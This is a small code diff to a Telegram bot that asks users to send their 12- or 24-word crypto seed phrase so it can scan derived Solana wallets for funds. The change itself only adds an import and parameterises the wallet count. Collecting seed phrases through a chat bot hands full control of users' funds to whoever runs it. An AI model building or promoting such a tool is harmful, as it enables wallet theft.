@@ -8,6 +8,7 @@ from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
 from solana.rpc.api import Client
 from solders.pubkey import Pubkey
 import base58
+from datetime import datetime
 
 # Configuration
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -62,7 +63,7 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_states[chat_id] = {'awaiting_seed': True}
     await update.message.reply_text(
         "📝 *Please send your 12 or 24-word seed phrase:*\n\n"
-        "I'll scan the first 100 wallets for any funds.",
+        f"I'll scan the first {MAX_WALLETS} wallets for any funds.",
         parse_mode='Markdown'
     )
 
